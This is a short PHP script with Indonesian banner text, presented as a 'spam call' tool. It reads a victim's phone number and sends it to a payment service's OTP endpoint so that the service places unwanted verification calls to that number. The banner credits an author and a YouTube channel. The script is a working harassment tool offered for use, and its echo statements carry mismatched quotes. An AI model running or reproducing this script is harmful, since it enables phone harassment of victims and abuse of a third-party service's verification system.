<?php
// Limit 3x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
		"NAMA 			: SCRIPT SPAM CALL
		 DIGUNAKAN 		: Limit 3 KALI
		 PEMBUAT		: RIZKY RAMBU ANARKI
		 YOUTUBE		: RIZKY CREATOR CUSTOM
		 COPYLIGHT		: YA
		 BISA Request 	: rizkycreatorcustom@gmail.com\n\n";
		 
echo "jail adalah tindakan tidak disiplin
gunakan script ini dengan bijak dan teliti
		pembuat script 				:RIZKY RAMBU ANARKI
		SUBSCRIBE CHANNEL YOUTUBE 	:Rizky Creator Custom\n\n";		 

echo "masukan No\target : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>